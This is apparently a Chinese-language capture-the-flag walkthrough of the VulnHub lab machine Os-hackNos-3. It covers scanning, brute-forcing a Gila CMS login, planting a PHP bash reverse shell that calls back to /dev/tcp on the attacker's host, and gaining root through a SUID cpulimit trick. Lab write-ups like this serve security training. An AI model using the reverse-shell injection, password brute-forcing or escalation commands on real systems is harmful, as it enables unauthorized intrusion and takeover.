# hackNos: Os-hackNos-3

2025.02.19 https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/

[video](https://www.bilibili.com/video/BV1gJABexE6o/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

扫描发现http://192.168.5.40/upload.php ffuf 探测一下参数，没找到。

看到 80 首页底部提示：find the Bug You need extra WebSec , 访问 http://192.168.5.40/websec/ 目录得到新的页面，gobuster 再次扫描，发现登陆页面，title 显示 Gila CMS 看看有没有爆出的漏洞，发现 RCE https://www.exploit-db.com/exploits/51569 但是需要用户凭据。

在首页底部发现了一个邮箱：contact@hacknos.com 需要找到密码，使用一个简单的密码字典进行爆破，得到了密码为 Securityx , 在扫描时需要调低扫描速度，系统会对登陆速率进行检测。

然后再次执行 51569 exp ，但是执行后是 404，exp 有问题，手动执行，在系统后台左侧 Content -> File Manager -> 编辑 index.php 文件，添加如下内容：

http://192.168.5.40/websec/admin/fm?f=./index.php

```
system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"');
```

然后访问： curl http://192.168.5.40/websec/ 在 kali 上获得了反弹 shell。

先拿到了 user flag：

```
www-data@hacknos:/home/blackdevil$ cat user.txt
bae11ce4f67af91fa58576c1da2aad4b
```

发现 suid 程序：

```
www-data@hacknos:/home/blackdevil$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
Process 2989 detected
# cd /root
# cat root.txt
########    #####     #####   ########         ########
##     ##  ##   ##   ##   ##     ##            ##     ##
##     ## ##     ## ##     ##    ##            ##     ##
########  ##     ## ##     ##    ##            ########
##   ##   ##     ## ##     ##    ##            ##   ##
##    ##   ##   ##   ##   ##     ##            ##    ##
##     ##   #####     #####      ##    ####### ##     ##


MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

Blog: www.hackNos.com

Linkedin: https://in.linkedin.com/in/rahulgehlaut
```

同时也可以利用 CVE-2021-4034 PwnKit 直接提权到 root。

最后看了一下其他的解决方式，发现 /var/local/database 文件,是一个利用 https://www.spammimic.com/spreadsheet.php?action=decode 编码的文件，可以将其内容进行解码，得到了密码 Security@x@，此密码为用户 blackdevil 的，切换成功后，sudo -l 有 ALL 权限，同样可以提权到 root。
